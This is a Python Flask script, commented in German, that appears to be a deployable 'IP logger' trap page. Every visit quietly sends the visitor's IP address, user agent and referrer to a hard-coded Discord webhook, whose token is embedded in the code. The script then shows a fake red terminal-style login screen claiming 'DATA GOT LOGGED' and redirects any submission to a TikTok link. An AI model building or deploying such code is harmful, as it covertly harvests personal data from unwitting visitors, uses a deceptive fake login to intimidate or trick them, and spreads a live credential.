from flask import Flask, request, render_template_string, redirect, url_for
import os
import time
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1528141663648747643/JC5ixuC30wfXA8jMDPiwp6KiekPi_XfrFNzTTj8u9sKXSwIKyzVi1jQPZn6azBUHkO_2"

def get_client_ip(req):
    headers = ['X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP', 'True-Client-IP']
    for header in headers:
        value = req.headers.get(header)
        if value:
            ip = value.split(',')[0].strip()
            if ip and not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
                return ip
    return req.remote_addr or 'Unknown'

def log_ip_to_discord(req):
    ip = get_client_ip(req)
    user_agent = req.headers.get('User-Agent', 'Unknown')
    referrer = req.headers.get('Referer', 'None')
    
    payload = {
        "content": f"🌐 **Neuer Besucher**",
        "embeds": [{
            "title": "IP Logger - Auto Log",
            "color": 16711680,
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "User-Agent", "value": f"`{user_agent[:300]}`", "inline": False},
                {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
            ]
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

# Fake Login Seite (wird nach dem Loggen angezeigt)
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>Terminal</title>
<style>
body{background:black;color:red;font-family:Consolas,monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.box{width:700px;border:2px solid red;padding:20px;box-shadow:0 0 20px red;}
input{width:100%;padding:10px;background:black;color:red;border:1px solid red;margin-top:10px;font-family:inherit;}
button{margin-top:10px;padding:10px 20px;background:red;color:black;border:none;cursor:pointer;font-weight:bold;}
.error{color:#ff5555;margin-top:10px;}
</style>
</head>
<body>
<div class="box">
<pre>
===========================
 CONNECTING...
 DATA GOT LOGGED
 WAITING FOR PASSWORD...
===========================
</pre>
<form method="POST">
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button>
</form>
</div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    # Sofort loggen, sobald jemand die Seite aufruft
    log_ip_to_discord(request)
    
    if request.method == "POST":
        # Passwort bleibt optional (kannst du später wieder aktivieren)
        return redirect("https://vm.tiktok.com/ZGd9711rQ/")
    
    # Zeige die Fake-Seite
    return render_template_string(LOGIN_PAGE)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
